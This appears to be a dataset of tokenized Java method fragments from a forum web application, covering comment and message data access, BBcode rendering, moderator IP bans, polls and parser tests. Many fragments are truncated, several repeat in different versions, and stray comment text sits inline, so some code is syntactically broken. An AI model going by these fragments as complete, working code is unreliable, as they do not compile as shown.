private synchronized boolean check ( String ip , boolean trusted ) { cleanup ( ) ; long current = System . currentTimeMillis ( ) ; if ( hash . containsKey ( ip ) ) { long date = hash . get ( ip ) ; if ( ( current - date ) < ( trusted ? THRESHOLD_TRUSTED : THRESHOLD ) ) { return false ; } } hash . put ( ip , current ) ; return true ; } 
private synchronized void cleanup ( ) { long current = System . currentTimeMillis ( ) ; for ( Iterator < Long > i = hash . values ( ) . iterator ( ) ; i . hasNext ( ) ; ) { long date = i . next ( ) ; 
public void setAsText ( String s ) throws IllegalArgumentException { if ( s . isEmpty ( ) ) { setValue ( null ) ; return ; } try { setValue ( userDao . getUserCached ( Integer . parseInt ( s ) ) ) ; 
public void initBinder ( WebDataBinder binder ) { binder . registerCustomEditor ( User . class , new UserIdPropertyEditor ( userDao ) ) ; } 
private User getModerator ( HttpServletRequest request ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new AccessViolationException ( " Not moderator " ) ; } return tmpl . getCurrentUser ( ) ; } 
public ModelAndView showFormTopic ( @ModelAttribute ( " add " ) @Valid AddCommentRequest add , HttpServletRequest request ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public String handleInvalidRequest ( ) { return " error-parameter " ; } 
public void requestValidator ( WebDataBinder binder ) { binder . setValidator ( new AddCommentRequestValidator ( ) ) ; binder . setBindingErrorProcessor ( new ExceptionBindingErrorProcessor ( ) ) ; } 
public void initBinder ( WebDataBinder binder ) { binder . registerCustomEditor ( SearchViewer . SearchOrder . class , new PropertyEditorSupport ( ) { @Override public void setAsText ( String s ) throws IllegalArgumentException { if ( " 1 " . equals ( s ) ) { for old links setValue(SearchViewer.SearchOrder.RELEVANCE); } else if ("2".equals(s)) { setValue(SearchViewer.SearchOrder.DATE); } else { setValue(SearchViewer.SearchOrder.valueOf(s)); } } }); binder.registerCustomEditor(SearchViewer.SearchInterval.class, new PropertyEditorSupport() { @Override public void setAsText(String s) throws IllegalArgumentException { setValue(SearchViewer.SearchInterval.valueOf(s.toUpperCase())); } }); binder.registerCustomEditor(SearchViewer.SearchRange.class, new PropertyEditorSupport() { @Override public void setAsText(String s) throws IllegalArgumentException { setValue(SearchViewer.SearchRange.valueOf(s.toUpperCase())); } }); binder.registerCustomEditor(User.class, new UserPropertyEditor(userDao)); binder.setBindingErrorProcessor(new ExceptionBindingErrorProcessor()); } 
public void checkDuplication ( String ip , boolean trusted , Errors errors ) { if ( ! check ( ip , trusted ) ) { errors . reject ( null , DuplicationException . MESSAGE ) ; 
private List < PreparedMessage > getPreparedMessages ( Connection db , boolean cached ) throws SQLException { List < Message > messages = cached ? getMessagesCached ( db ) : getMessages ( db ) ; List < PreparedMessage > pm = new ArrayList < PreparedMessage > ( messages . size ( ) ) ; for ( Message message : messages ) { PreparedMessage preparedMessage = new PreparedMessage ( db , message , false , mainUrl ) ; pm . add ( preparedMessage ) ; } return pm ; } 
public static ParserResult bb2xhtm ( String bbcode , boolean renderCut , boolean cleanCut , String cutUrl , UserDao userDao ) { RootNode rootNode = new RootNode ( parserWithOutImages ) ; rootNode . setRenderOptions ( renderCut , cleanCut , cutUrl ) ; rootNode . setUserDao ( userDao ) ; String html = parserWithOutImages . parse ( rootNode , bbcode ) . renderXHtml ( ) ; Set < User > replier = rootNode . getReplier ( ) ; return new ParserResult ( html , replier ) ; } 
public static ParserResult bb2xhtm ( String bbcode , boolean renderCut , boolean cleanCut , String cutUrl , Connection db ) { UserDao singleUserDao = new UserDao ( ) ; singleUserDao . setJdbcTemplate ( new SingleConnectionDataSource ( db , true ) ) ; return bb2xhtm ( bbcode , renderCut , cleanCut , cutUrl , singleUserDao ) ; } 
public void addReplier ( User nick ) { replier . add ( nick ) ; } 
public String renderNodeXhtml ( Node node ) { if ( node . lengthChildren ( ) = = 0 ) { return " " ; } TextNode txtNode = ( TextNode ) node . getChildren ( ) . iterator ( ) . next ( ) ; String memberName = Parser . escape ( txtNode . getText ( ) ) . trim ( ) ; String pattern ; try { if ( userDao ! = null ) { User user = userDao . getUser ( memberName ) ; if ( ! user . isBlocked ( ) ) { pattern = " <span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><a style= \" text-decoration: none \" href='/people/%s/profile'>%s</a></span> " ; if ( rootNode ! = null ) { rootNode . addReplier ( user ) ; } } else { pattern = " <span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><s><a style= \" text-decoration: none \" href='/people/%s/profile'>%s</a></s></span> " ; } } else { pattern = " %s " ; } } catch ( UserNotFoundException ex ) { pattern = " <s>%s</s> " ; } return String . format ( pattern , Parser . escape ( memberName ) , Parser . escape ( memberName ) ) ; } 
public void urlTest0 ( ) { Assert . assertEquals ( " <p><a href= \" http:linux.org.ru \" ><p>linux.org.ru</p></a></p> " , ParserUtil . bb2xhtml ( " [url=http:linux.org.ru] nlinux.org.ru[/url] " ) ) ; Assert . assertEquals ( " <p><a href= \" http:linux.org.ru \" >http:linux.org.ru</a></p> " , ParserUtil . bb2xhtml ( " [url] nhttp:linux.org.ru[/url] " ) ) ; 
public void urlTest1 ( ) { Assert . assertEquals ( " <p><a href= \" http:linux.org.ru \" >http:linux.org.ru</a></p> " , ParserUtil . bb2xhtml ( " [url=http:linux.org.ru][/url] " ) ) ; 
public void splinterTest1 ( ) throws Exception { http:www.linux.org.ru/forum/linux-org-ru/6448266 Assert.assertEquals(ParserUtil.bb2xhtml("[url=http:www.fishing.org/][user]splinter[/user][/url]", true, true, "", userDao), "<p><a href=\"http:www.fishing.org/\">http:www.fishing.org/</a><span style=\"white-space: nowrap\"><img src=\"/img/tuxlor.png\"><a style=\"text-decoration: none\" href='/people/splinter/profile'>splinter</a></span></p>"); 
public void initBinder ( WebDataBinder binder ) { binder . registerCustomEditor ( Message . class , new PropertyEditorSupport ( ) { @Override public void setAsText ( String text ) throws IllegalArgumentException { Connection db = null ; try { db = LorDataSource . getConnection ( ) ; setValue ( new Message ( db , Integer . parseInt ( text ) ) ) ; } catch ( SQLException e ) { throw new RuntimeException ( e ) ; } catch ( MessageNotFoundException e ) { throw new IllegalArgumentException ( e ) ; } finally { JdbcUtils . closeConnection ( db ) ; } } } ) ; binder . registerCustomEditor ( Comment . class , new PropertyEditorSupport ( ) { @Override 
public void setAsText ( String text ) throws IllegalArgumentException { if ( text . isEmpty ( ) | | text . equals ( " 0 " ) ) { setValue ( null ) ; return ; } Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public void deleteCommentWithSQLException ( int msgid , String reason , User user , int scoreBonus ) throws SQLException { deleteCommentWithoutTransaction ( msgid , reason , user , scoreBonus ) ; } 
public static Comment getComment ( Connection db , int msgid ) throws SQLException , MessageNotFoundException { Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " SELECT " + " postdate, topic, users.id as userid, comments.id as msgid, comments.title, " + " deleted, replyto, user_agents.name AS useragent, comments.postip " + " FROM comments " + " INNER JOIN users ON (users.id=comments.userid) " + " LEFT JOIN user_agents ON (user_agents.id=comments.ua_id) " + " WHERE comments.id= " + msgid ) ; if ( ! rs . next ( ) ) { throw new MessageNotFoundException ( msgid ) ; } return new Comment ( db , rs ) ; } 
public void setAsText ( String text ) throws IllegalArgumentException { if ( text . isEmpty ( ) | | " 0 " . equals ( text ) ) { setValue ( null ) ; return ; } Connection db = null ; try { db = LorDataSource . getConnection ( ) ; 
public Comment getComment ( final int msgid ) throws MessageNotFoundException { Comment comment = jdbcTemplate . execute ( new ConnectionCallback < Comment > ( ) { @Override public Comment doInConnection ( Connection con ) throws SQLException , DataAccessException { return getCommentInternal ( con , msgid ) ; } } ) ; if ( comment = = null ) { throw new MessageNotFoundException ( msgid ) ; 
public Comment doInConnection ( Connection con ) throws SQLException , DataAccessException { return getCommentInternal ( con , msgid ) ; } 
public static Comment getComment ( Connection db , int msgid ) throws SQLException , MessageNotFoundException { Comment comment = getCommentInternal ( db , msgid ) ; if ( comment = = null ) { throw new MessageNotFoundException ( msgid ) ; } return comment ; } 
private static Comment getCommentInternal ( Connection db , int msgid ) throws SQLException { Statement st = db . createStatement ( ) ; ResultSet rs = null ; try { rs = st . executeQuery ( " SELECT " + 
public Message getById ( int id ) throws MessageNotFoundException { Message message ; try { message = jdbcTemplate . queryForObject ( queryMessageById , new RowMapper < Message > ( ) { @Override public Message mapRow ( ResultSet resultSet , int i ) throws SQLException { return new Message ( resultSet ) ; } } , id ) ; } catch ( IncorrectResultSizeDataAccessException exception ) { throw new MessageNotFoundException ( id ) ; } return message ; } 
public Message mapRow ( ResultSet resultSet , int i ) throws SQLException { return new Message ( resultSet ) ; } 
public Comment getById ( int id ) throws MessageNotFoundException { Comment comment ; try { comment = jdbcTemplate . queryForObject ( queryCommentById , new RowMapper < Comment > ( ) { @Override public Comment mapRow ( ResultSet resultSet , int i ) throws SQLException { return new Comment ( resultSet , deleteInfoDao ) ; } } , id ) ; } catch ( IncorrectResultSizeDataAccessException exception ) { throw new MessageNotFoundException ( id ) ; } return comment ; } 
public Comment mapRow ( ResultSet resultSet , int i ) throws SQLException { return new Comment ( resultSet , deleteInfoDao ) ; } 
public DeleteInfo mapRow ( ResultSet resultSet , int i ) throws SQLException { return new DeleteInfo ( resultSet . getString ( " nick " ) , 
public Comment getById ( int id ) throws MessageNotFoundException { Comment comment ; try { comment = jdbcTemplate . queryForObject ( queryCommentById , new RowMapper < Comment > ( ) { @Override public Comment mapRow ( ResultSet resultSet , int i ) throws SQLException { return new Comment ( resultSet , deleteInfoDao ) ; } } , id ) ; } catch ( EmptyResultDataAccessException exception ) { throw new MessageNotFoundException ( id ) ; } return comment ; } 
public Message getById ( int id ) throws MessageNotFoundException { Message message ; try { message = jdbcTemplate . queryForObject ( queryMessageById , new RowMapper < Message > ( ) { @Override public Message mapRow ( ResultSet resultSet , int i ) throws SQLException { return new Message ( resultSet ) ; } } , id ) ; } catch ( EmptyResultDataAccessException exception ) { throw new MessageNotFoundException ( id ) ; } return message ; } 
public void initBinder ( WebDataBinder binder ) { binder . registerCustomEditor ( Message . class , new PropertyEditorSupport ( ) { @Override public void setAsText ( String text ) throws IllegalArgumentException { try { setValue ( messageDao . getById ( Integer . parseInt ( text ) ) ) ; } catch ( MessageNotFoundException e ) { throw new IllegalArgumentException ( e ) ; } } } ) ; binder . registerCustomEditor ( Comment . class , new PropertyEditorSupport ( ) { @Override 
public void setAsText ( String text ) throws IllegalArgumentException { try { setValue ( messageDao . getById ( Integer . parseInt ( text ) ) ) ; 
public void setAsText ( String text ) throws IllegalArgumentException { if ( text . isEmpty ( ) | | " 0 " . equals ( text ) ) { setValue ( null ) ; return ; } try { setValue ( commentDao . getComment ( Integer . parseInt ( text ) ) ) ; 
public void initBinder ( WebDataBinder binder ) { binder . registerCustomEditor ( Message . class , new PropertyEditorSupport ( ) { @Override public void setAsText ( String text ) throws IllegalArgumentException { try { setValue ( messageDao . getById ( Integer . parseInt ( text ) ) ) ; } catch ( MessageNotFoundException e ) { throw new IllegalArgumentException ( e ) ; } } } ) ; binder . registerCustomEditor ( Comment . class , new PropertyEditorSupport ( ) { @Override public void setAsText ( String text ) throws IllegalArgumentException { if ( text . isEmpty ( ) | | " 0 " . equals ( text ) ) { setValue ( null ) ; return ; } try { setValue ( commentDao . getComment ( Integer . parseInt ( text ) ) ) ; } catch ( MessageNotFoundException e ) { throw new IllegalArgumentException ( e ) ; } } } ) ; binder . registerCustomEditor ( User . class , new UserPropertyEditor ( userDao ) ) ; } 
public static List < PreparedComment > prepare ( CommentDao commentDao , UserDao userDao , CommentList comments , List < Comment > list ) throws UserNotFoundException , SQLException { List < PreparedComment > commentsPrepared = new ArrayList < PreparedComment > ( list . size ( ) ) ; for ( Comment comment : list ) { commentsPrepared . add ( new PreparedComment ( commentDao , userDao , comments , comment ) ) ; } return commentsPrepared ; } 
public void updateCurrentUser ( UserDao userDao ) { initCurrentUser ( userDao , true ) ; } 
private void initCurrentUser ( UserDao userDao , boolean forceUpdate ) { if ( ! isSessionAuthorized ( ) ) { return ; } if ( currentUser ! = null & & ! forceUpdate ) { return ; } try { currentUser = userDao . getUser ( ( String ) session . getAttribute ( " nick " ) ) ; 
public void processRow ( ResultSet resultSet ) throws SQLException { comments . add ( new Comment ( resultSet , deleteInfoDao ) ) ; } 
public String mapRow ( ResultSet resultSet , int i ) throws SQLException { String text = resultSet . getString ( " message " ) ; boolean isLorcode = resultSet . getBoolean ( " bbcode " ) ; if ( isLorcode ) { return ParserUtil . bb2xhtml ( text , true , true , " " , userDao ) ; 
public ModelAndView banIP ( HttpServletRequest request , @RequestParam ( " ip " ) String ip , @RequestParam ( " reason " ) String reason , @RequestParam ( " time " ) String time ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new IllegalAccessException ( " Not authorized " ) ; } Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; if ( " hour " . equals ( time ) ) { calendar . add ( Calendar . HOUR_OF_DAY , 1 ) ; } else if ( " day " . equals ( time ) ) { calendar . add ( Calendar . DAY_OF_MONTH , 1 ) ; } else if ( " month " . equals ( time ) ) { calendar . add ( Calendar . MONTH , 1 ) ; } else if ( " 3month " . equals ( time ) ) { calendar . add ( Calendar . MONTH , 3 ) ; } else if ( " 6month " . equals ( time ) ) { calendar . add ( Calendar . MONTH , 6 ) ; } else if ( " remove " . equals ( time ) ) { } else if ( " custom " . equals ( time ) ) { int days = ServletRequestUtils . getRequiredIntParameter ( request , " ban_days " ) ; if ( days < = 0 | | days > 180 ) { throw new UserErrorException ( " Invalid days count " ) ; } calendar . add ( Calendar . DAY_OF_MONTH , days ) ; } Timestamp ts ; if ( " unlim " . equals ( time ) ) { ts = null ; } else { ts = new Timestamp ( calendar . getTimeInMillis ( ) ) ; } Connection db = null ; try { IPBlockInfo blockInfo = ipBlockDao . getBlockInfo ( ip ) ; 
public IPBlockInfo mapRow ( ResultSet rs , int rowNum ) throws SQLException { return new IPBlockInfo ( rs ) ; } 
public ModelAndView sameIP ( HttpServletRequest request , @RequestParam ( required = false ) Integer msgid ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new AccessViolationException ( " Not moderator " ) ; } String ip ; ModelAndView mv = new ModelAndView ( " sameip " ) ; Connection db = null ; try { db = LorDataSource . getConnection ( ) ; int userAgentId = 0 ; if ( msgid ! = null ) { Statement ipst = db . createStatement ( ) ; ResultSet rs = ipst . executeQuery ( " SELECT postip, ua_id FROM topics WHERE id= " + msgid ) ; if ( ! rs . next ( ) ) { rs . close ( ) ; rs = ipst . executeQuery ( " SELECT postip, ua_id FROM comments WHERE id= " + msgid ) ; if ( ! rs . next ( ) ) { throw new MessageNotFoundException ( msgid ) ; } } ip = rs . getString ( " postip " ) ; userAgentId = rs . getInt ( " ua_id " ) ; if ( ip = = null ) { throw new ScriptErrorException ( " No IP data for # " + msgid ) ; } rs . close ( ) ; ipst . close ( ) ; } else { ip = ServletParameterParser . getIP ( request , " ip " ) ; } mv . getModel ( ) . put ( " ip " , ip ) ; mv . getModel ( ) . put ( " uaId " , userAgentId ) ; mv . getModel ( ) . put ( " topics " , getTopics ( db , ip ) ) ; mv . getModel ( ) . put ( " comments " , getComments ( db , ip ) ) ; mv . getModel ( ) . put ( " users " , getUsers ( db , ip , userAgentId ) ) ; } finally { JdbcUtils . closeConnection ( db ) ; } IPBlockInfo blockInfo = ipBlockDao . getBlockInfo ( ip ) ; if ( blockInfo ! = null ) { mv . getModel ( ) . put ( " blockInfo " , blockInfo ) ; mv . getModel ( ) . put ( " blockModerator " , userDao . getUserCached ( blockInfo . getModerator ( ) ) ) ; } return mv ; } 
public ModelAndView sameIP ( HttpServletRequest request , @RequestParam ( required = false ) Integer msgid ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new AccessViolationException ( " Not moderator " ) ; } String ip ; ModelAndView mv = new ModelAndView ( " sameip " ) ; Connection db = null ; try { db = LorDataSource . getConnection ( ) ; int userAgentId = 0 ; if ( msgid ! = null ) { Statement ipst = db . createStatement ( ) ; ResultSet rs = ipst . executeQuery ( " SELECT postip, ua_id FROM topics WHERE id= " + msgid ) ; if ( ! rs . next ( ) ) { rs . close ( ) ; rs = ipst . executeQuery ( " SELECT postip, ua_id FROM comments WHERE id= " + msgid ) ; if ( ! rs . next ( ) ) { throw new MessageNotFoundException ( msgid ) ; } } ip = rs . getString ( " postip " ) ; userAgentId = rs . getInt ( " ua_id " ) ; if ( ip = = null ) { throw new ScriptErrorException ( " No IP data for # " + msgid ) ; } rs . close ( ) ; ipst . close ( ) ; } else { ip = ServletParameterParser . getIP ( request , " ip " ) ; } mv . getModel ( ) . put ( " ip " , ip ) ; mv . getModel ( ) . put ( " uaId " , userAgentId ) ; mv . getModel ( ) . put ( " topics " , getTopics ( db , ip ) ) ; mv . getModel ( ) . put ( " comments " , getComments ( db , ip ) ) ; mv . getModel ( ) . put ( " users " , getUsers ( db , ip , userAgentId ) ) ; } finally { JdbcUtils . closeConnection ( db ) ; } IPBlockInfo blockInfo = ipBlockDao . getBlockInfo ( ip ) ; if ( blockInfo ! = null ) { mv . getModel ( ) . put ( " blockInfo " , blockInfo ) ; mv . getModel ( ) . put ( " blockModerator " , userDao . getUserCached ( blockInfo . getModerator ( ) ) ) ; } mv . getModel ( ) . put ( " tor " , IPBlockDao . getTor ( ip ) ) ; return mv ; } 
public static Message getMessage ( Connection db , int msgid ) throws SQLException , MessageNotFoundException { Statement st = db . createStatement ( ) ; ResultSet rs = st . executeQuery ( " SELECT " + " postdate, topics.id as msgid, userid, topics.title, " + " topics.groupid as guid, topics.url, topics.linktext, ua_id, " + " groups.title as gtitle, urlname, vote, havelink, section, topics.sticky, topics.postip, " + " postdate<(CURRENT_TIMESTAMP-sections.expire) as expired, deleted, lastmod, commitby, " + " commitdate, topics.stat1, postscore, topics.moderate, message, notop,bbcode, " + " topics.resolved, restrict_comments, minor " + " FROM topics " + " INNER JOIN groups ON (groups.id=topics.groupid) " + " INNER JOIN sections ON (sections.id=groups.section) " + " INNER JOIN msgbase ON (msgbase.id=topics.id) " + " WHERE topics.id= " + msgid ) ; if ( ! rs . next ( ) ) { throw new MessageNotFoundException ( msgid ) ; } return new Message ( rs ) ; } 
private void reindexMessage ( Connection db , int msgid , boolean withComments ) throws IOException , SolrServerException , SQLException , MessageNotFoundException { Message msg = Message . getMessage ( db , msgid ) ; if ( ! msg . isDeleted ( ) ) { updateMessage ( msg ) ; } else { logger.info("Deleting message "+msgid+" from solr"); solrServer.deleteById((Integer.toString(msg.getId()))); } if (withComments) { CommentList commentList = CommentList.getCommentList(db, msg, true); 
private static String processMessage ( String msg , String mode ) { if ( " lorcode " . equals ( mode ) ) { return msg ; } HTMLFormatter form = new HTMLFormatter ( msg ) ; form . setMaxLength ( 80 ) ; form.enableUrlHighLightMode(); form.setOutputLorcode(true); if ("ntobr".equals(mode)) { form.enableNewLineMode(); form.enableQuoting(); } if ("quot".equals(mode)) { form.enableTexNewLineMode(); form.enableQuoting(); } return form.process(); } 
public static PreparedComment prepare ( CommentDao commentDao , UserDao userDao , Comment comment ) throws UserNotFoundException { return new PreparedComment ( commentDao , userDao , null , comment ) ; } 
public static List < PreparedComment > prepare ( CommentDao commentDao , UserDao userDao , CommentList comments , List < Comment > list ) throws UserNotFoundException { List < PreparedComment > commentsPrepared = new ArrayList < PreparedComment > ( list . size ( ) ) ; for ( Comment comment : list ) { commentsPrepared . add ( new PreparedComment ( commentDao , userDao , comments , comment ) ) ; } return commentsPrepared ; } 
public void removeUserInfo ( User user ) { String userInfo = getUserInfo ( user ) ; if ( userInfo = = null | | userInfo . trim ( ) . isEmpty ( ) ) { return ; } setUserInfo ( user , null ) ; changeScore ( user , - 10 ) ; } 
public int saveNewMessage ( Connection db , String message ) throws SQLException { PreparedStatement pstMsgbase = null ; PreparedStatement pst = null ; try { allocation MSGID 
public static int saveNewMessage ( Connection db , Comment comment , String message ) throws SQLException { PreparedStatement pstMsgbase = null ; PreparedStatement pst = null ; try { allocation MSGID 
public Integer doInConnection ( Connection db ) throws SQLException , DataAccessException { PreparedStatement pstMsgbase = null ; PreparedStatement pst = null ; ResultSet rs = null ; Statement st = null ; try { allocation MSGID 
public boolean isUserCanDelete ( User user ) { Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; calendar . add ( Calendar . DAY_OF_MONTH , - 1 ) ; Timestamp hourDeltaTime = new Timestamp ( calendar . getTimeInMillis ( ) ) ; return ( postdate . compareTo ( hourDeltaTime ) > = 0 & & userid = = user . getId ( ) ) ; } 
public boolean isModeratorCanDelete ( User user , Section section ) { if ( ! user . canModerate ( ) ) { return false ; } Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; calendar . add ( Calendar . MONTH , - 1 ) ; Timestamp monthDeltaTime = new Timestamp ( calendar . getTimeInMillis ( ) ) ; boolean ret = false ; if ( section . isPremoderated ( ) & & ! moderate ) { ret = true ; } if ( ! ret & & postdate . compareTo ( monthDeltaTime ) > = 0 ) { ret = true ; } return ret ; } 
public Message getById ( int id ) throws MessageNotFoundException { Message message ; try { message = jdbcTemplate . queryForObject ( queryMessage , new RowMapper < Message > ( ) { @Override public Message mapRow ( ResultSet resultSet , int i ) throws SQLException { return new Message ( resultSet ) ; } } , id ) ; } catch ( EmptyResultDataAccessException exception ) { throw new MessageNotFoundException ( id ) ; } return message ; } 
public void removeUserInfo ( User user ) { String userInfo = getUserInfo ( user ) ; if ( userInfo = = null | | userInfo . trim ( ) . isEmpty ( ) ) return ; setUserInfo ( user , null ) ; changeScore ( user . getId ( ) , - 10 ) ; } 
public void changeScore ( int id , int delta ) { jdbcTemplate . update ( queryChangeScore , delta , id ) ; } 
public void addUserRefEvent ( User [ ] refs , int topic , int comment ) { if ( refs . length = = 0 ) { return ; } Map [ ] batch = new Map [ refs . length ] ; for ( int i = 0 ; i < refs . length ; i + + ) { User ref = refs [ i ] ; batch [ i ] = ImmutableMap . < String , Object > of ( " userid " , ref . getId ( ) , " type " , " REF " , " private " , false , " message_id " , topic , " comment_id " , comment ) ; } insert . executeBatch ( batch ) ; } 
public boolean isDeletableByUser ( User user ) { Calendar calendar = Calendar . getInstance ( ) ; calendar . setTime ( new Date ( ) ) ; calendar . add ( Calendar . HOUR_OF_DAY , - 1 ) ; Timestamp hourDeltaTime = new Timestamp ( calendar . getTimeInMillis ( ) ) ; return ( postdate . compareTo ( hourDeltaTime ) > = 0 & & userid = = user . getId ( ) ) ; } 
public boolean equals ( Object o ) { if ( this = = o ) return true ; if ( o = = null | | getClass ( ) ! = o . getClass ( ) ) return false ; User user = ( User ) o ; if ( id ! = user . id ) return false ; return true ; } 
public void cut4Test ( ) { Assert . assertEquals ( " <div id= \" cut0 \" ><p>test</p></div><div id= \" cut1 \" ><p>test</p></div> " , ParserUtil . bb2xhtml ( " [cut] ntest[/cut][cut]test[/cut] " , true , false , " " ) ) ; } 
public int getPollId ( int topicId ) throws PollNotFoundException { try { return jdbcTemplate . queryForObject ( queryPoolIdByTopicId , Integer . class , topicId ) ; 
public Poll getCurrentPoll ( ) throws PollNotFoundException { return getPoll ( getCurrentPollId ( ) ) ; } 
public Poll getPoll ( final int poolId ) throws PollNotFoundException { final int currentPollId = getCurrentPollId ( ) ; try { return jdbcTemplate . queryForObject ( queryPool , 
public Poll mapRow ( ResultSet resultSet , int i ) throws SQLException { return new Poll ( poolId , resultSet . getInt ( " topic " ) , resultSet . getBoolean ( " multiselect " ) , poolId = = currentPollId ) ; } 
public PreparedPoll preparePoll ( Poll poll ) { return new PreparedPoll ( poll , pollDao . getMaxVote ( poll ) , pollDao . getPollVariants ( poll , Poll . ORDER_VOTES ) ) ; } 
public PreparedMessage prepareMessage ( Message message , boolean includeCut ) { return prepareMessage ( message , includeCut , " " ) ; } 
public PreparedMessage prepareMessage ( Message message , boolean includeCut , String mainUrl ) { return prepareMessage ( message , messageDao . getTags ( message ) , includeCut , mainUrl ) ; } 
public PreparedMessage prepareMessage ( Message message , List < String > tags ) { return prepareMessage ( message , tags , true , " " ) ; } 
public PreparedMessage prepareMessage ( Message message , List < String > tags , boolean includeCut , String mainUrl ) { try { Group group = groupDao . getGroup ( message . getGroupId ( ) ) ; 
public void processRow ( ResultSet resultSet ) throws SQLException { EditInfoDTO editInfoDTO = new EditInfoDTO ( ) ; editInfoDTO . setId ( resultSet . getInt ( " id " ) ) ; editInfoDTO . setMsgid ( resultSet . getInt ( " msgid " ) ) ; editInfoDTO . setEditor ( resultSet . getInt ( " editor " ) ) ; editInfoDTO . setOldmessage ( resultSet . getString ( " oldmessage " ) ) ; editInfoDTO . setEditdate ( resultSet . getTimestamp ( " editdate " ) ) ; editInfoDTO . setOldtitle ( resultSet . getString ( " oldtitle " ) ) ; editInfoDTO . setOldtags ( resultSet . getString ( " oldtags " ) ) ; editInfoDTOs . add ( editInfoDTO ) ; } 
public void processRow ( ResultSet resultSet ) throws SQLException { tags . add ( resultSet . getString ( " value " ) ) ; } 
public int getPollId ( int topicId ) throws PollNotFoundException { try { return jdbcTemplate . queryForInt ( queryPoolIdByTopicId , topicId ) ; 
public void processRow ( ResultSet resultSet ) throws SQLException { variants . add ( new PollVariant ( resultSet . getInt ( " id " ) , resultSet . getString ( " label " ) , 
public ModelAndView undeleteForm ( HttpServletRequest request , @RequestParam int msgid ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } Message message = messageDao . getById ( msgid ) ; checkUndeletable ( message ) ; ModelAndView mv = new ModelAndView ( " undelete " ) ; mv . getModel ( ) . put ( " message " , message ) ; mv . getModel ( ) . put ( " preparedMessage " , prepareService . prepareMessage ( message , true ) ) ; return mv ; } 
public void undelete ( Message message ) { jdbcTemplate . update ( updateUndeleteMessage , message . getId ( ) ) ; jdbcTemplate . update ( updateUneleteInfo , message . getId ( ) ) ; } 
public PreparedComment prepareComment ( Comment comment ) throws UserNotFoundException { return prepareComment ( comment , ( CommentList ) null ) ; } 
public PreparedComment prepareComment ( Comment comment , String message ) throws UserNotFoundException { User author = userDao . getUserCached ( comment . getUserid ( ) ) ; String processedMessage = PreparedComment . getProcessedMessage ( userDao , message ) . getHtml ( ) ; return new PreparedComment ( comment , author , processedMessage , null ) ; } 
public List < PreparedComment > prepareCommentList ( CommentList comments , List < Comment > list ) throws UserNotFoundException { List < PreparedComment > commentsPrepared = new ArrayList < PreparedComment > ( list . size ( ) ) ; for ( Comment comment : list ) { commentsPrepared . add ( prepareComment ( comment , comments ) ) ; } return commentsPrepared ; } 
public void prepareMessageTest ( ) { ImmutableList < String > tags = ImmutableList . of ( " one " , " two " ) ; Message message = mock ( Message . class ) ; PollDaoImpl pollDao = mock ( PollDaoImpl . class ) ; GroupDao groupDao = mock ( GroupDao . class ) ; UserDao userDao = mock ( UserDao . class ) ; SectionDao sectionDao = mock ( SectionDao . class ) ; DeleteInfoDao deleteInfoDao = mock ( DeleteInfoDao . class ) ; MessageDao messageDao = mock ( MessageDao . class ) ; UserAgentDao userAgentDao = mock ( UserAgentDao . class ) ; when ( message . getGroupId ( ) ) . thenReturn ( 13 ) ; group id 13 
private static User getModerator ( HttpServletRequest request ) throws Exception { Template tmpl = Template . getTemplate ( request ) ; if ( ! tmpl . isModeratorSession ( ) ) { throw new AccessViolationException ( " Not moderator " ) ; } return tmpl . getCurrentUser ( ) ; } 
private static ModelAndView redirectToProfile ( User user ) { Random random = new Random ( ) ; return new ModelAndView ( new RedirectView ( " /people/ " + URLEncoder . encode ( user . getNick ( ) ) + " /profile?nocache= " + random . nextInt ( ) ) ) ; } 
public static EditInfoDTO createFromMessage ( Connection db , Message message ) throws SQLException { EditInfoDTO current = new EditInfoDTO ( ) ; current . setOldmessage ( message . getMessage ( ) ) ; current . setEditdate ( message . getPostdate ( ) ) ; current . setEditor ( message . getUid ( ) ) ; current . setMsgid ( message . getMessageId ( ) ) ; current . setOldtags ( TagDao . toString ( TagDao . getMessageTags ( db , message . getMessageId ( ) ) ) ) ; return current ; } 
public boolean updateMessageText ( Connection db , User editor , List < String > newTags ) throws SQLException { SingleConnectionDataSource scds = new SingleConnectionDataSource ( db , true ) ; PreparedStatement pstGet = db . prepareStatement ( " SELECT message,title FROM msgbase JOIN topics ON msgbase.id=topics.id WHERE topics.id=? FOR UPDATE " ) ; pstGet . setInt ( 1 , msgid ) ; ResultSet rs = pstGet . executeQuery ( ) ; if ( ! rs . next ( ) ) { throw new RuntimeException ( " Can't fetch previous message text " ) ; } String oldMessage = rs . getString ( " message " ) ; String oldTitle = rs . getString ( " title " ) ; rs . close ( ) ; pstGet . close ( ) ; List < String > oldTags = TagDao . getMessageTags ( db , msgid ) ; EditInfoDTO editInfo = new EditInfoDTO ( ) ; editInfo . setMsgid ( msgid ) ; editInfo . setEditor ( editor . getId ( ) ) ; boolean modified = false ; SimpleJdbcTemplate jdbcTemplate = new SimpleJdbcTemplate ( scds ) ; if ( ! oldMessage . equals ( message ) ) { editInfo . setOldmessage ( oldMessage ) ; modified = true ; jdbcTemplate . update ( " UPDATE msgbase SET message=:message WHERE id=:msgid " , ImmutableMap . of ( " message " , message , " msgid " , msgid ) ) ; } if ( ! oldTitle . equals ( title ) ) { modified = true ; editInfo . setOldtitle ( oldTitle ) ; jdbcTemplate . update ( " UPDATE topics SET title=:title WHERE id=:id " , ImmutableMap . of ( " title " , title , " id " , msgid ) ) ; } if ( newTags ! = null ) { boolean modifiedTags = TagDao . updateTags ( 